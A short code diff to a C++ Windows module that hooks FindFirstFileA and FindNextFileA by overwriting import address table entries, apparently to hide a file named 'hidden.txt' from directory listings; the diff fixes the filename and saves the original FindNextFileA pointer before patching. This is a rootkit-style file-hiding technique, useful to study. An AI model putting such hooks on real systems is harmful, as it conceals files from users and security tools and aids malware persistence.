@@ -1,10 +1,11 @@
 #include "Hooking.h"
-#include <stdio.h>
 #include "pch.h"
+#include <stdio.h>
 
-FindFirstFileA_t OriginalFFF = NULL;
-FindNextFileA_t OriginalFNF = NULL;
-char FileName[] = "hidded.txt";
+
+FindFirstFileA_t OriginalFFF = nullptr;
+FindNextFileA_t OriginalFNF = nullptr;
+char FileName[] = "hidden.txt";
 
 extern "C" {
 	HANDLE WINAPI HookedFFF(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindData) {
@@ -50,6 +51,7 @@ extern "C" {
 						VirtualProtect(ppFunc, sizeof(PROC), oldProtect, &oldProtect);
 					} else if (*ppFunc == (PROC)GetProcAddress(GetModuleHandle(L"KERNEL32.dll"), "FindNextFileA")) {
 						VirtualProtect(ppFunc, sizeof(PROC), PAGE_EXECUTE_READWRITE, &oldProtect);
+						OriginalFNF = (FindNextFileA_t)*ppFunc;
 						*ppFunc = (PROC)HookedFNF;
 						VirtualProtect(ppFunc, sizeof(PROC), oldProtect, &oldProtect);
 						break;
